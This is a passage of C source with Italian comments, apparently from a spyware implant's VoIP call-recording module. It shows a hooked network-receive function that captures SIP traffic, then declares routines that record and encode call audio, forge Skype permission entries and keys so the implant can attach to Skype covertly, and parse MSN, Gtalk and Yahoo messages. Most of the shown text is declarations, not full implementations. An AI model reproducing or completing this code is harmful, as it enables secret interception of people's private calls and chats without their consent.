	if (!Active || !(*Active))
		return ret_code;

	if(lpNumberOfBytesRecvd) {
		msg_len = *lpNumberOfBytesRecvd;
		buf = lpBuffers[0].buf;
		if (msg_len>15 && buf[0]=='S' && buf[1]=='I' && buf[2]=='P' && buf[3]=='/')
			pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_YMSG_IN, IPC_HI_PRIORITY);
	}

	return ret_code;
}

DWORD PM_WSARecv_setup(HMServiceStruct *pData);


// Inserisce un campione nell'array (i campioni arrivano gia' ordinati dalla coda IPC)
BOOL InsertList(BYTE* channel_array, BYTE* sample, DWORD sample_len, DWORD offset);

// Salva la lista come file encodato
#define SPEEX_FREE	{rel_speex_encoder_destroy(state); rel_speex_bits_destroy(&bits);}
void SaveEncode(BYTE* source, DWORD total_size, DWORD channels, pVoiceAdditionalData additional_data, DWORD additional_len);

// Salva la lista come wav
void SaveWav(BYTE* channel_array, DWORD size, DWORD channels, pVoiceAdditionalData additional_data, DWORD additional_len);

// Carica (se risce) la DLL del codec e risolve tutti i simboli utilizzati
#define RESOLVE_ERROR { FreeLibrary(hcodec); return NULL; }
HMODULE ResolveCodecSymbols(char* name);

// Ritorna l'additional data da inserire nel file
// NON e' thread safe (tanto la richiamo solo da una funzione)
#define MAX_PEER_LEN 500
pVoiceAdditionalData VoipGetAdditionalData(partner_entry* partner_list, DWORD in_out, DWORD* add_len);

// Calcola la differenza fra due FILETIME in decimi di secondo
int TimeDiff(FILETIME* elem_1, FILETIME* elem_2);
void EndCall();
// NULL termina la stringa nella coda IPC
void NullTerminatePacket(DWORD len, BYTE* msg);
// Libera la lista degli interlocutori
void FreePartnerList(partner_entry** head);
// Puo' essere richiamata solo da dentro il processo di skype (uno dei suoi setup degli hook)
BOOL IsSkypePMInstalled();
#define GENERIC_FIELD_LEN MAX_PATH*2
// Usabile solo in questo caso, perche' potrebbe tornare dei campi inesistenti
// ma tanto al fine dei nostri check poco ci interessa leggere dei campi in piu' 
// con valori NULL
char* GetXMLNodeA(char* data, char* node, char* buffer);

//// Verifica se l'ACL nel file corrisponde alla nostra
//BOOL CheckACL(char *key1, char *key2, char *key3, char *key4, char *path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
//{
//	if (/*!stricmp(key1, m_key1) &&*/ !stricmp(key2, m_key2) && !stricmp(key3, m_key3) && !stricmp(key4, m_key4)/* && !stricmp(path, m_path)*/)
//		return TRUE;
//	return FALSE;
//}

DWORD RapidGetFileSize(HANDLE hfile);

// Verifica se nel file di config c'e' la nostra ACL
// Se non riesce ad aprire il file, torna che l'acl c'e'. Altrimenti potrebbe scriverla piu' volte...tanto poi non riuscirebbe comunque a scriverla
BOOL IsACLPresent(WCHAR* config_path, char* m_key1, char* m_key2, char* m_key3, char* m_key4, char* m_path);
// Scriva la nostra ACL nel file di config
BOOL WriteSkypeACL(WCHAR* config_path, char* key1, char* key2, char* key3, char* key4, char* key5, char* key6, char* path, BOOL isOld);

// Torna TRUE se e' precedente alla 5.5.0.X
BOOL IsOldSkypeVersion(WCHAR* config_path);

extern BOOL SkypeACLKeyGen(char *lpUserName, char *lpFileName, char *lpOutKey1, char *lpOutKey2, char *lpOutKey3, char *lpOutKey4, char *lpOutKey5, char *lpOutKey6, char *lpOutPath, BOOL isOld);
BOOL CalculateUserHash(WCHAR* user_name, WCHAR* file_path, char* m_key1, char* m_key2, char* m_key3, char* m_key4, char* m_key5, char* m_key6, char* m_path, BOOL isOld);

// Cerca (e in caso fa calcolare) gli hash corretti relativi ad un particolare utente
BOOL FindHashKeys(WCHAR* user_name, WCHAR* file_path, char* m_key1, char* m_key2, char* m_key3, char* m_key4, char* m_key5, char* m_key6, char* m_path, BOOL isOld);

void StartSkypeAsUser(char* skype_exe_path, STARTUPINFO* si, PROCESS_INFORMATION* pi);
void SKypeNameConvert(WCHAR* path, WCHAR* user_name, DWORD size);
// Inserisce i permessi corretti per potersi attaccare a skype come plugin
void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR* skype_path);
// Monitora costantemente la possibilita' di attaccarsi come API client a Skype
DWORD WINAPI MonitorSkypePM(BOOL* semaphore);
BOOL ParseMsnMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags);
BOOL ParseGtalkMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags);
BOOL ParseYahooMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags);
BOOL ParseSkypeMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags);
BOOL ParseSamplingMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags);
DWORD __stdcall PM_VoipRecordDispatch(BYTE* msg, DWORD dwLen, DWORD dwFlags, FILETIME* time_nanosec);
DWORD __stdcall PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset);
DWORD __stdcall PM_VoipRecordInit(JSONObject elem);
DWORD __stdcall PM_VoipRecordUnregister();
void PM_VoipRecordRegister();
